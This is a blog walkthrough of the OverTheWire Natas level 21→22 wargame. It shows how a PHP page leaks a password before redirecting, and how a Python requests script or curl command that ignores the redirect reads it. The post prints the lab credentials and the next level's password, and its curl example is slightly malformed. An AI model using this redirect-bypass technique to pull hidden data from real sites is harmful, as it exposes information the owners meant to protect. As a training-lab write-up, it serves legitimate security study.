---
layout: post-with-comments
title: "OverTheWire Natas Level 21 → 22 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-21-to-22/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, redirect, http, php]
description: "A step by step tutorial for OverTheWire Natas Level 21 → 22!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-20-to-21/' | relative_url }}">← Previous: Level 20 → 21</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas22.html" target="_blank" rel="noopener">
      Official (Level 22) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-22-to-23/' | relative_url }}">
      Next: Level 22 → 23 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas22.natas.labs.overthewire.org](http://natas22.natas.labs.overthewire.org)

Credentials: **natas22\:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz**

```bash
# Using curl (optional):
curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 
  "http://natas22.natas.labs.overthewire.org/?revelio=1"
```

![homepage]({{ '/assets/images/natas/level-21-to-22/homepage.jpg' | relative_url }})

---

## Task

The source shows:

```php
session_start();

if (array_key_exists("revelio", $_GET)) {
  // only admins can reveal the password
  if (!($_SESSION && array_key_exists("admin", $_SESSION) && $_SESSION["admin"] == 1)) {
    header("Location: /");
  }
}

if (array_key_exists("revelio", $_GET)) {
  print "You are an admin. The credentials for the next level are:<br>";
  ...
}
```

The page **prints the password** when `?revelio=1` is present — *even for non-admins* — but then sends a **redirect**. Browsers follow the redirect and hide the printed content. If we **do not follow redirects**, we can read it.

---

## Solution 

### Python `requests`

```python
import requests

url = "http://natas22.natas.labs.overthewire.org/?revelio=1"
auth = ("natas22", "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz")

# Do not follow the Location redirect
r = requests.get(url, auth=auth, allow_redirects=False)
print(r.text)
```

Output includes the creds straight in the body.

![result]({{ '/assets/images/natas/level-21-to-22/result.jpg' | relative_url }})

---

## Password

```
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```

---

## Why this works

* PHP **echoes content** before calling `header("Location: /")`.
* Browsers **follow** the redirect, so users don’t see the echoed content.
* Tools like `curl`/`requests` can **disable redirects** and see the original response.

---

## Troubleshooting

* Seeing only the homepage? Ensure you requested `?revelio=1`.
* Still getting redirected? Turn off following:

  * `curl` → add `--max-redirs 0`
  * `requests` → `allow_redirects=False`
* Blank? Your auth might be wrong; recheck username/password.

---

**Nice! 🎉** That’s a neat example of leaking sensitive data **before** a redirect. Onward to **natas23**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
